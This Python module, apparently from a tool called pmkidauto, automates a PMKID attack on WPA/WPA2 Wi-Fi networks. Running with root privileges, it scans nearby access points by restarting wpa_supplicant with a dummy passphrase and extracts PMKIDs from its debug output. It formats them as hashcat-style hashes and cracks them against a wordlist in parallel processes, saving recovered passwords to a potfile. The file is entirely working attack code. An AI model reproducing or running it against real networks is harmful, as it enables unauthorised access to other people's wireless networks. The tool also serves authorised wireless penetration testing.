import multiprocessing as mp
import os
import subprocess

import pmkidauto.file_man as fm
from pmkidauto.check import Check
from pmkidauto.line_scrapper import LineScrapper


def elevator():
    if os.geteuid() != 0:
        print('[Warning] This program requires root privileges, consider install/running as superuser (sudo).')
        msg = "[sudo] password for %u:"
        subprocess.check_call(f"sudo -v -p '{msg}'", shell=True)
        return True


class Auto:
    _stop_supp = ['systemctl', 'stop', 'wpa_supplicant.service']
    _start_supp = ['systemctl', 'start', 'wpa_supplicant.service']

    def __init__(self, my_interface: str,
                 wordlist='',
                 scan_time='7',
                 time_out='15',
                 hash_file='hashes.22000',
                 pot_file='found.potfile'):

        self._wlan_mac = ['cat', f'/sys/class/net/{my_interface}/address']
        self._commsupp = ['timeout', scan_time, 'wpa_supplicant', '-c', 'wpa_supp.conf', '-i', my_interface,
                          '-dd']  # using timeout, just works...
        self._commsupp2 = ['timeout', time_out, 'wpa_supplicant', '-c', 'wpa_supp.conf', '-i', my_interface,
                           '-dd']
        self.hash_file = hash_file
        self.pot_file = pot_file
        self.wordlist = wordlist
        self._ls = LineScrapper()
        self.sudo_require = elevator()
        try:
            self._sem = mp.BoundedSemaphore(value=mp.cpu_count())
        except FileNotFoundError:
            print('Python multiprocessing BoundedSemaphore does not seem to work on your system. Starting '
                  'capture-only mode ...')
            self.wordlist = ''

    def run_command(self, command):
        if self.sudo_require:
            command.insert(0, 'sudo')
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE)
            return process.communicate()[0].decode()
        except FileNotFoundError:
            pass

    @staticmethod
    def over_conf(essid=""):
        fm.create_write_file('wpa_supp.conf', 'network={{\nssid="{}"\npsk="12345678"\n}}'.format(essid))

    def get_mac(self):
        return self.run_command(self._wlan_mac).strip().replace(":", "")

    def b_force(self, hash_to_crack, essid_name):
        wl = fm.try_open_read_file(self.wordlist)
        self._sem.acquire()
        ck = Check(hash_to_crack)
        for line in wl:
            word = line.strip()
            if len(word) <= 7:
                continue
            if ck.check_pass(word):
                print(f'    [FOUND!] => ESSID:"{essid_name}": PSK:"{word}"')
                to_potfile = f'{hash_to_crack}:{word}'
                print(f'    [HASH] => {to_potfile}')
                fm.create_write_file(self.pot_file, to_potfile, 'a+')
                self._sem.release()
                return

        print(f'[!] AP "{essid_name}" wordlist exhausted')
        self._sem.release()

    def start(self):
        print('[!] Scanning...')
        self.over_conf()
        self.run_command(self._stop_supp)
        _cli_bssid = self.get_mac()
        essid_bssid_list = self._ls.get_ap_list(self.run_command(self._commsupp))
        if essid_bssid_list:
            print(f'[!] Found {len(essid_bssid_list)} AP(s) :)')
            for d in essid_bssid_list:
                essid = ap_bssid = ''
                for kv in d.items():
                    essid, ap_bssid = kv
                    self.over_conf(essid)
                if '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' in essid:
                    print(f'[!] AP "{ap_bssid}" with hidden essid, skipping...')
                    continue
                pmkid = self._ls.get_pmkid(self.run_command(self._commsupp2))
                if not pmkid:
                    print(f'[!] AP "{essid}" is faraway or not vulnerable.')
                    continue
                elif '00000000000000000000000000000000' in pmkid:
                    print(f'[!] Zeroed pmkid, AP "{essid}" is NOT vulnerable.')
                    continue
                else:
                    pmkid_hash = f"WPA*01*{pmkid}*{ap_bssid.replace(':', '')}*{_cli_bssid}*{essid.encode().hex()}***"
                    if fm.search_in_potfile(self.pot_file, pmkid_hash, essid):
                        continue
                    else:
                        print(f'[!] AP "{essid}" pmkid hash found! :)')
                        fm.save_line_in_hashes(self.hash_file, pmkid_hash)
                        if self.wordlist:
                            print(f'[!] AP "{essid}" trying crack...')
                            mp.Process(target=self.b_force, args=(pmkid_hash, essid)).start()
        else:
            print('[!] No AP found :( Try increase "--scan_time".')
        self.run_command(self._start_supp)
